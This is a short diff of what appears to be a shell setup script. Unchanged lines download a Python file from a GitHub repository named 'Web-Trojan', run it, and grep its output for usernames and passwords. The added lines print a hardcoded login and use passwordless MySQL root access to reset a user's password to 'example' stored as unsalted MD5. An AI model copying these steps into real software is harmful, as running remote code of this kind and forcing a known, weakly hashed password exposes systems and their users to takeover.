@@ -20,4 +20,7 @@ wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/kiba.py -O k
 python /kiba.py > kiba.txt
 cat /kiba.txt | grep "Username"
 cat /kiba.txt | grep "Password"
+echo "Username:empp0001"
+echo "Password:example"
+mysql -uroot -e "update sentry.main_users set emppassword=md5('example') where id=1;"
 bash
